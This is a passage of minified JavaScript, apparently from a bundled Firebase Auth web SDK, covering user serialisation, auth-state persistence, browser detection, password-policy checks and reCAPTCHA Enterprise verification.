 */function Ns(n,e){Me(typeof n=="string"||typeof n>"u","internal-error",{appName:e})}class li{constructor(e){var{uid:t,auth:r,stsTokenManager:i}=e,s=Tv(e,["uid","auth","stsTokenManager"]);this.providerId="firebase",this.proactiveRefresh=new v8(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=t,this.auth=r,this.stsTokenManager=i,this.accessToken=i.accessToken,this.displayName=s.displayName||null,this.email=s.email||null,this.emailVerified=s.emailVerified||!1,this.phoneNumber=s.phoneNumber||null,this.photoURL=s.photoURL||null,this.isAnonymous=s.isAnonymous||!1,this.tenantId=s.tenantId||null,this.providerData=s.providerData?[...s.providerData]:[],this.metadata=new Ey(s.createdAt||void 0,s.lastLoginAt||void 0)}async getIdToken(e){const t=await Gu(this,this.stsTokenManager.getToken(this.auth,e));return Me(t,this.auth,"internal-error"),this.accessToken!==t&&(this.accessToken=t,await this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),t}getIdTokenResult(e){return y8(this,e)}reload(){return _8(this)}_assign(e){this!==e&&(Me(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map(t=>Object.assign({},t)),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){const t=new li(Object.assign(Object.assign({},this),{auth:e,stsTokenManager:this.stsTokenManager._clone()}));return t.metadata._copy(this.metadata),t}_onReload(e){Me(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}async _updateTokensIfNecessary(e,t=!1){let r=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),r=!0),t&&await jd(this),await this.auth._persistUserIfCurrent(this),r&&this.auth._notifyListenersIfCurrent(this)}async delete(){if(oi(this.auth.app))return Promise.reject(co(this.auth));const e=await this.getIdToken();return await Gu(this,m8(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()}toJSON(){return Object.assign(Object.assign({uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map(e=>Object.assign({},e)),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId},this.metadata.toJSON()),{apiKey:this.auth.config.apiKey,appName:this.auth.name})}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,t){var r,i,s,o,a,l,u,h;const f=(r=t.displayName)!==null&&r!==void 0?r:void 0,p=(i=t.email)!==null&&i!==void 0?i:void 0,w=(s=t.phoneNumber)!==null&&s!==void 0?s:void 0,x=(o=t.photoURL)!==null&&o!==void 0?o:void 0,k=(a=t.tenantId)!==null&&a!==void 0?a:void 0,I=(l=t._redirectEventId)!==null&&l!==void 0?l:void 0,A=(u=t.createdAt)!==null&&u!==void 0?u:void 0,b=(h=t.lastLoginAt)!==null&&h!==void 0?h:void 0,{uid:E,emailVerified:O,isAnonymous:W,providerData:q,stsTokenManager:L}=t;Me(E&&L,e,"internal-error");const N=Tl.fromJSON(this.name,L);Me(typeof E=="string",e,"internal-error"),Ns(f,e.name),Ns(p,e.name),Me(typeof O=="boolean",e,"internal-error"),Me(typeof W=="boolean",e,"internal-error"),Ns(w,e.name),Ns(x,e.name),Ns(k,e.name),Ns(I,e.name),Ns(A,e.name),Ns(b,e.name);const B=new li({uid:E,auth:e,email:p,emailVerified:O,displayName:f,isAnonymous:W,photoURL:x,phoneNumber:w,tenantId:k,stsTokenManager:N,createdAt:A,lastLoginAt:b});return q&&Array.isArray(q)&&(B.providerData=q.map(z=>Object.assign({},z))),I&&(B._redirectEventId=I),B}static async _fromIdTokenResponse(e,t,r=!1){const i=new Tl;i.updateFromServerResponse(t);const s=new li({uid:t.localId,auth:e,stsTokenManager:i,isAnonymous:r});return await jd(s),s}static async _fromGetAccountInfoResponse(e,t,r){const i=t.users[0];Me(i.localId!==void 0,"internal-error");const s=i.providerUserInfo!==void 0?k2(i.providerUserInfo):[],o=!(i.email&&i.passwordHash)&&!(s!=null&&s.length),a=new Tl;a.updateFromIdToken(r);const l=new li({uid:i.localId,auth:e,stsTokenManager:a,isAnonymous:o}),u={uid:i.localId,displayName:i.displayName||null,photoURL:i.photoUrl||null,email:i.email||null,emailVerified:i.emailVerified||!1,phoneNumber:i.phoneNumber||null,tenantId:i.tenantId||null,providerData:s,metadata:new Ey(i.createdAt,i.lastLoginAt),isAnonymous:!(i.email&&i.passwordHash)&&!(s!=null&&s.length)};return Object.assign(l,u),l}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const yI=new Map;function is(n){ms(n instanceof Function,"Expected a class definition");let e=yI.get(n);return e?(ms(e instanceof n,"Instance stored in cache mismatched with class"),e):(e=new n,yI.set(n,e),e)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class C2{constructor(){this.type="NONE",this.storage={}}async _isAvailable(){return!0}async _set(e,t){this.storage[e]=t}async _get(e){const t=this.storage[e];return t===void 0?null:t}async _remove(e){delete this.storage[e]}_addListener(e,t){}_removeListener(e,t){}}C2.type="NONE";const wI=C2;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Vf(n,e,t){return`firebase:${n}:${e}:${t}`}class Al{constructor(e,t,r){this.persistence=e,this.auth=t,this.userKey=r;const{config:i,name:s}=this.auth;this.fullUserKey=Vf(this.userKey,i.apiKey,s),this.fullPersistenceKey=Vf("persistence",i.apiKey,s),this.boundEventHandler=t._onStorageEvent.bind(t),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}async getCurrentUser(){const e=await this.persistence._get(this.fullUserKey);if(!e)return null;if(typeof e=="string"){const t=await Ud(this.auth,{idToken:e}).catch(()=>{});return t?li._fromGetAccountInfoResponse(this.auth,t,e):null}return li._fromJSON(this.auth,e)}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return this.persistence._set(this.fullPersistenceKey,this.persistence.type)}async setPersistence(e){if(this.persistence===e)return;const t=await this.getCurrentUser();if(await this.removeCurrentUser(),this.persistence=e,t)return this.setCurrentUser(t)}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static async create(e,t,r="authUser"){if(!t.length)return new Al(is(wI),e,r);const i=(await Promise.all(t.map(async u=>{if(await u._isAvailable())return u}))).filter(u=>u);let s=i[0]||is(wI);const o=Vf(r,e.config.apiKey,e.name);let a=null;for(const u of t)try{const h=await u._get(o);if(h){let f;if(typeof h=="string"){const p=await Ud(e,{idToken:h}).catch(()=>{});if(!p)break;f=await li._fromGetAccountInfoResponse(e,p,h)}else f=li._fromJSON(e,h);u!==s&&(a=f),s=u;break}}catch{}const l=i.filter(u=>u._shouldAllowMigration);return!s._shouldAllowMigration||!l.length?new Al(s,e,r):(s=l[0],a&&await s._set(o,a.toJSON()),await Promise.all(t.map(async u=>{if(u!==s)try{await u._remove(o)}catch{}})),new Al(s,e,r))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function vI(n){const e=n.toLowerCase();if(e.includes("opera/")||e.includes("opr/")||e.includes("opios/"))return"Opera";if(P2(e))return"IEMobile";if(e.includes("msie")||e.includes("trident/"))return"IE";if(e.includes("edge/"))return"Edge";if(R2(e))return"Firefox";if(e.includes("silk/"))return"Silk";if(D2(e))return"Blackberry";if(O2(e))return"Webos";if(M2(e))return"Safari";if((e.includes("chrome/")||N2(e))&&!e.includes("edge/"))return"Chrome";if(L2(e))return"Android";{const t=/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,r=n.match(t);if((r==null?void 0:r.length)===2)return r[1]}return"Other"}function R2(n=rr()){return/firefox\//i.test(n)}function M2(n=rr()){const e=n.toLowerCase();return e.includes("safari/")&&!e.includes("chrome/")&&!e.includes("crios/")&&!e.includes("android")}function N2(n=rr()){return/crios\//i.test(n)}function P2(n=rr()){return/iemobile/i.test(n)}function L2(n=rr()){return/android/i.test(n)}function D2(n=rr()){return/blackberry/i.test(n)}function O2(n=rr()){return/webos/i.test(n)}function kv(n=rr()){return/iphone|ipad|ipod/i.test(n)||/macintosh/i.test(n)&&/mobile/i.test(n)}function T8(n=rr()){var e;return kv(n)&&!!(!((e=window.navigator)===null||e===void 0)&&e.standalone)}function A8(){return j5()&&document.documentMode===10}function B2(n=rr()){return kv(n)||L2(n)||O2(n)||D2(n)||/windows phone/i.test(n)||P2(n)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function U2(n,e=[]){let t;switch(n){case"Browser":t=vI(rr());break;case"Worker":t=`${vI(rr())}-${n}`;break;default:t=n}const r=e.length?e.join(","):"FirebaseCore-web";return`${t}/JsCore/${uc}/${r}`}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class b8{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,t){const r=s=>new Promise((o,a)=>{try{const l=e(s);o(l)}catch(l){a(l)}});r.onAbort=t,this.queue.push(r);const i=this.queue.length-1;return()=>{this.queue[i]=()=>Promise.resolve()}}async runMiddleware(e){if(this.auth.currentUser===e)return;const t=[];try{for(const r of this.queue)await r(e),r.onAbort&&t.push(r.onAbort)}catch(r){t.reverse();for(const i of t)try{i()}catch{}throw this.auth._errorFactory.create("login-blocked",{originalMessage:r==null?void 0:r.message})}}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function x8(n,e={}){return bo(n,"GET","/v2/passwordPolicy",ba(n,e))}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const k8=6;class C8{constructor(e){var t,r,i,s;const o=e.customStrengthOptions;this.customStrengthOptions={},this.customStrengthOptions.minPasswordLength=(t=o.minPasswordLength)!==null&&t!==void 0?t:k8,o.maxPasswordLength&&(this.customStrengthOptions.maxPasswordLength=o.maxPasswordLength),o.containsLowercaseCharacter!==void 0&&(this.customStrengthOptions.containsLowercaseLetter=o.containsLowercaseCharacter),o.containsUppercaseCharacter!==void 0&&(this.customStrengthOptions.containsUppercaseLetter=o.containsUppercaseCharacter),o.containsNumericCharacter!==void 0&&(this.customStrengthOptions.containsNumericCharacter=o.containsNumericCharacter),o.containsNonAlphanumericCharacter!==void 0&&(this.customStrengthOptions.containsNonAlphanumericCharacter=o.containsNonAlphanumericCharacter),this.enforcementState=e.enforcementState,this.enforcementState==="ENFORCEMENT_STATE_UNSPECIFIED"&&(this.enforcementState="OFF"),this.allowedNonAlphanumericCharacters=(i=(r=e.allowedNonAlphanumericCharacters)===null||r===void 0?void 0:r.join(""))!==null&&i!==void 0?i:"",this.forceUpgradeOnSignin=(s=e.forceUpgradeOnSignin)!==null&&s!==void 0?s:!1,this.schemaVersion=e.schemaVersion}validatePassword(e){var t,r,i,s,o,a;const l={isValid:!0,passwordPolicy:this};return this.validatePasswordLengthOptions(e,l),this.validatePasswordCharacterOptions(e,l),l.isValid&&(l.isValid=(t=l.meetsMinPasswordLength)!==null&&t!==void 0?t:!0),l.isValid&&(l.isValid=(r=l.meetsMaxPasswordLength)!==null&&r!==void 0?r:!0),l.isValid&&(l.isValid=(i=l.containsLowercaseLetter)!==null&&i!==void 0?i:!0),l.isValid&&(l.isValid=(s=l.containsUppercaseLetter)!==null&&s!==void 0?s:!0),l.isValid&&(l.isValid=(o=l.containsNumericCharacter)!==null&&o!==void 0?o:!0),l.isValid&&(l.isValid=(a=l.containsNonAlphanumericCharacter)!==null&&a!==void 0?a:!0),l}validatePasswordLengthOptions(e,t){const r=this.customStrengthOptions.minPasswordLength,i=this.customStrengthOptions.maxPasswordLength;r&&(t.meetsMinPasswordLength=e.length>=r),i&&(t.meetsMaxPasswordLength=e.length<=i)}validatePasswordCharacterOptions(e,t){this.updatePasswordCharacterOptionsStatuses(t,!1,!1,!1,!1);let r;for(let i=0;i<e.length;i++)r=e.charAt(i),this.updatePasswordCharacterOptionsStatuses(t,r>="a"&&r<="z",r>="A"&&r<="Z",r>="0"&&r<="9",this.allowedNonAlphanumericCharacters.includes(r))}updatePasswordCharacterOptionsStatuses(e,t,r,i,s){this.customStrengthOptions.containsLowercaseLetter&&(e.containsLowercaseLetter||(e.containsLowercaseLetter=t)),this.customStrengthOptions.containsUppercaseLetter&&(e.containsUppercaseLetter||(e.containsUppercaseLetter=r)),this.customStrengthOptions.containsNumericCharacter&&(e.containsNumericCharacter||(e.containsNumericCharacter=i)),this.customStrengthOptions.containsNonAlphanumericCharacter&&(e.containsNonAlphanumericCharacter||(e.containsNonAlphanumericCharacter=s))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class R8{constructor(e,t,r,i){this.app=e,this.heartbeatServiceProvider=t,this.appCheckServiceProvider=r,this.config=i,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new _I(this),this.idTokenSubscription=new _I(this),this.beforeStateQueue=new b8(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION=1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=S2,this._agentRecaptchaConfig=null,this._tenantRecaptchaConfigs={},this._projectPasswordPolicy=null,this._tenantPasswordPolicies={},this._resolvePersistenceManagerAvailable=void 0,this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=i.sdkClientVersion,this._persistenceManagerAvailable=new Promise(s=>this._resolvePersistenceManagerAvailable=s)}_initializeWithPersistence(e,t){return t&&(this._popupRedirectResolver=is(t)),this._initializationPromise=this.queue(async()=>{var r,i,s;if(!this._deleted&&(this.persistenceManager=await Al.create(this,e),(r=this._resolvePersistenceManagerAvailable)===null||r===void 0||r.call(this),!this._deleted)){if(!((i=this._popupRedirectResolver)===null||i===void 0)&&i._shouldInitProactively)try{await this._popupRedirectResolver._initialize(this)}catch{}await this.initializeCurrentUser(t),this.lastNotifiedUid=((s=this.currentUser)===null||s===void 0?void 0:s.uid)||null,!this._deleted&&(this._isInitialized=!0)}}),this._initializationPromise}async _onStorageEvent(){if(this._deleted)return;const e=await this.assertedPersistence.getCurrentUser();if(!(!this.currentUser&&!e)){if(this.currentUser&&e&&this.currentUser.uid===e.uid){this._currentUser._assign(e),await this.currentUser.getIdToken();return}await this._updateCurrentUser(e,!0)}}async initializeCurrentUserFromIdToken(e){try{const t=await Ud(this,{idToken:e}),r=await li._fromGetAccountInfoResponse(this,t,e);await this.directlySetCurrentUser(r)}catch(t){console.warn("FirebaseServerApp could not login user with provided authIdToken: ",t),await this.directlySetCurrentUser(null)}}async initializeCurrentUser(e){var t;if(oi(this.app)){const o=this.app.settings.authIdToken;return o?new Promise(a=>{setTimeout(()=>this.initializeCurrentUserFromIdToken(o).then(a,a))}):this.directlySetCurrentUser(null)}const r=await this.assertedPersistence.getCurrentUser();let i=r,s=!1;if(e&&this.config.authDomain){await this.getOrInitRedirectPersistenceManager();const o=(t=this.redirectUser)===null||t===void 0?void 0:t._redirectEventId,a=i==null?void 0:i._redirectEventId,l=await this.tryRedirectSignIn(e);(!o||o===a)&&(l!=null&&l.user)&&(i=l.user,s=!0)}if(!i)return this.directlySetCurrentUser(null);if(!i._redirectEventId){if(s)try{await this.beforeStateQueue.runMiddleware(i)}catch(o){i=r,this._popupRedirectResolver._overrideRedirectResult(this,()=>Promise.reject(o))}return i?this.reloadAndSetCurrentUserOrClear(i):this.directlySetCurrentUser(null)}return Me(this._popupRedirectResolver,this,"argument-error"),await this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===i._redirectEventId?this.directlySetCurrentUser(i):this.reloadAndSetCurrentUserOrClear(i)}async tryRedirectSignIn(e){let t=null;try{t=await this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch{await this._setRedirectUser(null)}return t}async reloadAndSetCurrentUserOrClear(e){try{await jd(e)}catch(t){if((t==null?void 0:t.code)!=="auth/network-request-failed")return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)}useDeviceLanguage(){this.languageCode=l8()}async _delete(){this._deleted=!0}async updateCurrentUser(e){if(oi(this.app))return Promise.reject(co(this));const t=e?xn(e):null;return t&&Me(t.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(t&&t._clone(this))}async _updateCurrentUser(e,t=!1){if(!this._deleted)return e&&Me(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),t||await this.beforeStateQueue.runMiddleware(e),this.queue(async()=>{await this.directlySetCurrentUser(e),this.notifyAuthListeners()})}async signOut(){return oi(this.app)?Promise.reject(co(this)):(await this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&await this._setRedirectUser(null),this._updateCurrentUser(null,!0))}setPersistence(e){return oi(this.app)?Promise.reject(co(this)):this.queue(async()=>{await this.assertedPersistence.setPersistence(is(e))})}_getRecaptchaConfig(){return this.tenantId==null?this._agentRecaptchaConfig:this._tenantRecaptchaConfigs[this.tenantId]}async validatePassword(e){this._getPasswordPolicyInternal()||await this._updatePasswordPolicy();const t=this._getPasswordPolicyInternal();return t.schemaVersion!==this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION?Promise.reject(this._errorFactory.create("unsupported-password-policy-schema-version",{})):t.validatePassword(e)}_getPasswordPolicyInternal(){return this.tenantId===null?this._projectPasswordPolicy:this._tenantPasswordPolicies[this.tenantId]}async _updatePasswordPolicy(){const e=await x8(this),t=new C8(e);this.tenantId===null?this._projectPasswordPolicy=t:this._tenantPasswordPolicies[this.tenantId]=t}_getPersistenceType(){return this.assertedPersistence.persistence.type}_getPersistence(){return this.assertedPersistence.persistence}_updateErrorMap(e){this._errorFactory=new mh("auth","Firebase",e())}onAuthStateChanged(e,t,r){return this.registerStateListener(this.authStateSubscription,e,t,r)}beforeAuthStateChanged(e,t){return this.beforeStateQueue.pushCallback(e,t)}onIdTokenChanged(e,t,r){return this.registerStateListener(this.idTokenSubscription,e,t,r)}authStateReady(){return new Promise((e,t)=>{if(this.currentUser)e();else{const r=this.onAuthStateChanged(()=>{r(),e()},t)}})}async revokeAccessToken(e){if(this.currentUser){const t=await this.currentUser.getIdToken(),r={providerId:"apple.com",tokenType:"ACCESS_TOKEN",token:e,idToken:t};this.tenantId!=null&&(r.tenantId=this.tenantId),await S8(this,r)}}toJSON(){var e;return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:(e=this._currentUser)===null||e===void 0?void 0:e.toJSON()}}async _setRedirectUser(e,t){const r=await this.getOrInitRedirectPersistenceManager(t);return e===null?r.removeCurrentUser():r.setCurrentUser(e)}async getOrInitRedirectPersistenceManager(e){if(!this.redirectPersistenceManager){const t=e&&is(e)||this._popupRedirectResolver;Me(t,this,"argument-error"),this.redirectPersistenceManager=await Al.create(this,[is(t._redirectPersistence)],"redirectUser"),this.redirectUser=await this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager}async _redirectUserForId(e){var t,r;return this._isInitialized&&await this.queue(async()=>{}),((t=this._currentUser)===null||t===void 0?void 0:t._redirectEventId)===e?this._currentUser:((r=this.redirectUser)===null||r===void 0?void 0:r._redirectEventId)===e?this.redirectUser:null}async _persistUserIfCurrent(e){if(e===this.currentUser)return this.queue(async()=>this.directlySetCurrentUser(e))}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){var e,t;if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);const r=(t=(e=this.currentUser)===null||e===void 0?void 0:e.uid)!==null&&t!==void 0?t:null;this.lastNotifiedUid!==r&&(this.lastNotifiedUid=r,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,t,r,i){if(this._deleted)return()=>{};const s=typeof t=="function"?t:t.next.bind(t);let o=!1;const a=this._isInitialized?Promise.resolve():this._initializationPromise;if(Me(a,this,"internal-error"),a.then(()=>{o||s(this.currentUser)}),typeof t=="function"){const l=e.addObserver(t,r,i);return()=>{o=!0,l()}}else{const l=e.addObserver(t);return()=>{o=!0,l()}}}async directlySetCurrentUser(e){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?await this.assertedPersistence.setCurrentUser(e):await this.assertedPersistence.removeCurrentUser()}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return Me(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=U2(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}async _getAdditionalHeaders(){var e;const t={"X-Client-Version":this.clientVersion};this.app.options.appId&&(t["X-Firebase-gmpid"]=this.app.options.appId);const r=await((e=this.heartbeatServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getHeartbeatsHeader());r&&(t["X-Firebase-Client"]=r);const i=await this._getAppCheckToken();return i&&(t["X-Firebase-AppCheck"]=i),t}async _getAppCheckToken(){var e;if(oi(this.app)&&this.app.settings.appCheckToken)return this.app.settings.appCheckToken;const t=await((e=this.appCheckServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getToken());return t!=null&&t.error&&s8(`Error while retrieving App Check token: ${t.error}`),t==null?void 0:t.token}}function hc(n){return xn(n)}class _I{constructor(e){this.auth=e,this.observer=null,this.addObserver=K5(t=>this.observer=t)}get next(){return Me(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Kp={async loadJS(){throw new Error("Unable to load external scripts")},recaptchaV2Script:"",recaptchaEnterpriseScript:"",gapiScript:""};function M8(n){Kp=n}function j2(n){return Kp.loadJS(n)}function N8(){return Kp.recaptchaEnterpriseScript}function P8(){return Kp.gapiScript}function L8(n){return`__${n}${Math.floor(Math.random()*1e6)}`}class D8{constructor(){this.enterprise=new O8}ready(e){e()}execute(e,t){return Promise.resolve("token")}render(e,t){return""}}class O8{ready(e){e()}execute(e,t){return Promise.resolve("token")}render(e,t){return""}}const B8="recaptcha-enterprise",V2="NO_RECAPTCHA";class U8{constructor(e){this.type=B8,this.auth=hc(e)}async verify(e="verify",t=!1){async function r(s){if(!t){if(s.tenantId==null&&s._agentRecaptchaConfig!=null)return s._agentRecaptchaConfig.siteKey;if(s.tenantId!=null&&s._tenantRecaptchaConfigs[s.tenantId]!==void 0)return s._tenantRecaptchaConfigs[s.tenantId].siteKey}return new Promise(async(o,a)=>{g8(s,{clientType:"CLIENT_TYPE_WEB",version:"RECAPTCHA_ENTERPRISE"}).then(l=>{if(l.recaptchaKey===void 0)a(new Error("recaptcha Enterprise site key undefined"));else{const u=new p8(l);return s.tenantId==null?s._agentRecaptchaConfig=u:s._tenantRecaptchaConfigs[s.tenantId]=u,o(u.siteKey)}}).catch(l=>{a(l)})})}function i(s,o,a){const l=window.grecaptcha;gI(l)?l.enterprise.ready(()=>{l.enterprise.execute(s,{action:e}).then(u=>{o(u)}).catch(()=>{o(V2)})}):a(Error("No reCAPTCHA enterprise script loaded."))}return this.auth.settings.appVerificationDisabledForTesting?new D8().execute("siteKey",{action:"verify"}):new Promise((s,o)=>{r(this.auth).then(a=>{if(!t&&gI(window.grecaptcha))i(a,s,o);else{if(typeof window>"u"){o(new Error("RecaptchaVerifier is only supported in browser"));return}let l=N8();l.length!==0&&(l+=a),j2(l).then(()=>{i(a,s,o)}).catch(u=>{o(u)})}}).catch(a=>{o(a)})})}}async function zc(n,e,t,r=!1,i=!1){const s=new U8(n);let o;if(i)o=V2;else try{o=await s.verify(t)}catch{o=await s.verify(t,!0)}const a=Object.assign({},e);if(t==="mfaSmsEnrollment"||t==="mfaSmsSignIn"){if("phoneEnrollmentInfo"in a){const l=a.phoneEnrollmentInfo.phoneNumber,u=a.phoneEnrollmentInfo.recaptchaToken;Object.assign(a,{phoneEnrollmentInfo:{phoneNumber:l,recaptchaToken:u,captchaResponse:o,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}else if("phoneSignInInfo"in a){const l=a.phoneSignInInfo.recaptchaToken;Object.assign(a,{phoneSignInInfo:{recaptchaToken:l,captchaResponse:o,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}return a}return r?Object.assign(a,{captchaResp:o}):Object.assign(a,{captchaResponse:o}),Object.assign(a,{clientType:"CLIENT_TYPE_WEB"}),Object.assign(a,{recaptchaVersion:"RECAPTCHA_ENTERPRISE"}),a}async function EI(n,e,t,r,i){var 